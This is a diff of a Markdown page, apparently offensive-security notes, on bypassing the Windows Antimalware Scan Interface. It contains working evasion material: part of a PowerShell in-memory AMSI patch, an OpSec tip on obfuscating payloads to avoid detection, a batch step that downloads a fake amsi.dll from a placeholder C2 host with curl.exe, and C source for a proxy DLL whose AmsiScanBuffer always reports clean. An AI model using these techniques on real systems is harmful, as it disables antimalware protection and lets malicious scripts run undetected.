@@ -2,11 +2,11 @@
 title: AMSI
 ---
 
-The *Antimalware Scan Interface* is used by endpoint protection to prevent PowerShell, VBScript, JScript and Office VBA macros from executing if they match known bad patterns.
+Endpoint protection software uses the *Antimalware Scan Interface* to prevent PowerShell, VBScript, JScript and Office VBA macros from executing if they match known bad patterns.
 
 > **OpSec:**
 > The payloads below require obfuscation.
-> Heavily obfuscated payloads are detected more frequently than payloads that are only slightly modified in the right places.
+> Heavily obfuscated payloads are detected more frequently than payloads that are only slightly modified in the right place.
 
 Patch AMSI in PowerShell with Matt Graebers reflection method.
 
@@ -60,9 +60,9 @@ $d = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [Win32]::VirtualProtect($b, [uint32]3, 0x20, [ref]$c)
 ~~~
 
-Alternate `AmsiScanBuffer` at process-level from [senzee1984](https://github.com/senzee1984/Amsi_Bypass_In_2023/blob/main/Attack_AmsiScanBuffer.ps1).
+Variation from [senzee1984](https://github.com/senzee1984/Amsi_Bypass_In_2023/blob/main/Attack_AmsiScanBuffer.ps1).
 
-Copy `powershell.exe` and a fake `asmi.dll` into a temporary directory ([source](https://twitter.com/eversinc33/status/1666121784192581633)).
+Alternatively copy `powershell.exe` and a fake `asmi.dll` into a temporary directory ([source](https://twitter.com/eversinc33/status/1666121784192581633)).
 
 ~~~ bat
 copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe .
@@ -74,6 +74,7 @@ curl.exe -O https://c2.attacker.com/amsi.dll
 `./amsi.c` ([source](https://gist.github.com/eversinc33/beb43d05695de77a030c97ab769682ca)):
 
 ~~~ c
+#include <windows.h>
 #pragma comment(linker, "/export:AmsiCloseSession=amsiorg.AmsiCloseSession,@1")
 #pragma comment(linker, "/export:AmsiInitialize=amsiorg.AmsiInitialize,@2")
 #pragma comment(linker, "/export:AmsiOpenSession=amsiorg.AmsiOpenSession,@3")
@@ -87,7 +88,7 @@ curl.exe -O https://c2.attacker.com/amsi.dll
 #pragma comment(linker, "/export:DllRegisterServer=amsiorg.DllRegisterServer,@12")
 #pragma comment(linker, "/export:DllUnregisterServer=amsiorg.DllUnregisterServer,@13")
 
-extern "C" __declspec(dllexport) HRESULT AmsiScanBuffer(HANDLE context, PVOID buffer, ULONG length, LPCWSTR name, LPVOID session, INT* result) {
+__declspec(dllexport) HRESULT AmsiScanBuffer(HANDLE context, PVOID buffer, ULONG length, LPCWSTR name, LPVOID session, INT* result) {
     *result = 0;
     return S_OK;
 }
